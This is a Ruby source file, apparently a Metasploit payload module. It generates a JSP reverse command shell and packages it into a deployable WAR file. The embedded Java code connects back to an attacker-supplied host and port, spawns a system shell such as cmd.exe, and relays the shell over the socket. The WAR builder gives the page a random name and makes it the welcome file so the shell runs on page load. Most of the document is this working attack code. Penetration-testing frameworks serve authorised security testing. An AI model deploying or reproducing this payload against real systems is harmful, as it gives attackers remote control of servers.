##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Java JSP Command Shell, Reverse TCP Inline',
      'Description'   => 'Connect back to attacker and spawn a command shell',
      'Author'        => [ 'sf' ],
      'License'       => MSF_LICENSE,
      'Platform'      => %w{ linux osx solaris unix win },
      'Arch'          => ARCH_JAVA,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
    register_options( [ OptString.new( 'SHELL', [ true, "The system shell to use.", 'cmd.exe' ]), ], self.class )
  end


  def generate
    # JSP Reverse Shell modified from: http://www.security.org.sg/code/jspreverse.html
    jsp = %q{
      <%@page import="java.lang.*"%>
      <%@page import="java.util.*"%>
      <%@page import="java.io.*"%>
      <%@page import="java.net.*"%>

      <%
        class StreamConnector extends Thread
        {
          InputStream is;
          OutputStream os;

          StreamConnector( InputStream is, OutputStream os )
          {
            this.is = is;
            this.os = os;
          }

          public void run()
          {
            BufferedReader in  = null;
            BufferedWriter out = null;
            try
            {
              in  = new BufferedReader( new InputStreamReader( this.is ) );
              out = new BufferedWriter( new OutputStreamWriter( this.os ) );
              char buffer[] = new char[8192];
              int length;
              while( ( length = in.read( buffer, 0, buffer.length ) ) > 0 )
              {
                out.write( buffer, 0, length );
                out.flush();
              }
            } catch( Exception e ){}
            try
            {
              if( in != null )
                in.close();
              if( out != null )
                out.close();
            } catch( Exception e ){}
          }
        }

        try
        {
          Socket socket = new Socket( "LHOST", LPORT );
          Process process = Runtime.getRuntime().exec( "SHELL" );
          ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
          ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
        } catch( Exception e ) {}
      %>
    }

    if( !datastore['LHOST'] or datastore['LHOST'].empty? )
      return super
    end

    jsp = jsp.gsub( "LHOST", datastore['LHOST'] )

    jsp = jsp.gsub( "LPORT", datastore['LPORT'].to_s )

    jsp = jsp.gsub( "SHELL", datastore['SHELL'] )

    return super + jsp
  end

  def generate_war
    jsp_name = "#{Rex::Text.rand_text_alpha_lower(rand(8)+8)}.jsp"

    zip = Rex::Zip::Jar.new

    web_xml = <<-EOF
<?xml version="1.0"?>
<!DOCTYPE web-app PUBLIC
"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
"http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app>
  <welcome-file-list>
    <welcome-file>#{jsp_name}</welcome-file>
  </welcome-file-list>
</web-app>
  EOF

    zip.add_file("WEB-INF/", '')
    zip.add_file("WEB-INF/web.xml", web_xml)
    zip.add_file(jsp_name, generate)

    zip
  end

end
